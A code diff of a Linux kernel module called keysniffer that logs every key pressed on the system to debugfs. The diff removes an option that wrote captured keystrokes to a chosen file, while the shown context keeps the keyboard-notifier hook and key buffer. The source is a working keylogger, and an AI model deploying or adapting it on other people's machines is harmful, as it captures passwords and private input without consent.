@@ -26,11 +26,6 @@
 #include <linux/debugfs.h>
 #include <linux/input.h>
 
-#include <linux/fs.h>
-#include <linux/buffer_head.h>
-#include <asm/segment.h>
-#include <asm/uaccess.h>
-
 #define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 #define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */
 #define US  0 /* Type code for US character log */
@@ -38,19 +33,14 @@
 #define DEC 2 /* Type code for decimal log */
 
 static int codes; /* Log type module parameter */
-static char *output_path;
-struct file *output;
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
 MODULE_VERSION("1.4");
 MODULE_DESCRIPTION("Sniff and log keys pressed in the system to debugfs");
 
-/* Module parameters */
 module_param(codes, int, 0644);
 MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");
-module_param(output_path, charp, 0644);
-MODULE_PARM_DESC(output_path, "path (output file path)");
 
 /* Declarations */
 static struct dentry *file;
@@ -180,19 +170,7 @@ int keysniffer_cb(struct notifier_block *nblock,
 	strncpy(keys_buf + buf_pos, keybuf, len);
 	buf_pos += len;
 	keys_buf[buf_pos++] = '\n';
-	if (output == NULL) {
-		pr_debug("%s\n", keybuf);
-	} else {
-		mm_segment_t oldfs;
-		oldfs = get_fs();
-		set_fs(KERNEL_DS);
-		loff_t off = 0;
-
-		vfs_write(output, keybuf, len, &off);
-		vfs_write(output, "\n", 1, &off);
-
-		set_fs(oldfs);
-	}
+	pr_debug("%s\n", keybuf);
 
 	return NOTIFY_OK;
 }
@@ -204,22 +182,16 @@ static int __init keysniffer_init(void)
 	if (codes < 0 || codes > 2)
 		return -EINVAL;
 
-	if (output_path == NULL) {
-		subdir = debugfs_create_dir("kisni", NULL);
-		if (IS_ERR(subdir))
-			return PTR_ERR(subdir);
-		if (!subdir)
-			return -ENOENT;
+	subdir = debugfs_create_dir("kisni", NULL);
+	if (IS_ERR(subdir))
+		return PTR_ERR(subdir);
+	if (!subdir)
+		return -ENOENT;
 
-		file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
-		if (!file) {
-			debugfs_remove_recursive(subdir);
-			return -ENOENT;
-		}
-	} else{
-		output = filp_open(output_path, O_WRONLY|O_CREAT|O_APPEND, 0400);
-		if (IS_ERR(output))
-			return -ENOENT;
+	file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
+	if (!file) {
+		debugfs_remove_recursive(subdir);
+		return -ENOENT;
 	}
 
 	register_keyboard_notifier(&keysniffer_blk);
@@ -230,8 +202,6 @@ static void __exit keysniffer_exit(void)
 {
 	unregister_keyboard_notifier(&keysniffer_blk);
 	debugfs_remove_recursive(subdir);
-	if (output != NULL)
-		filp_close(output, NULL);
 }
 
 module_init(keysniffer_init);
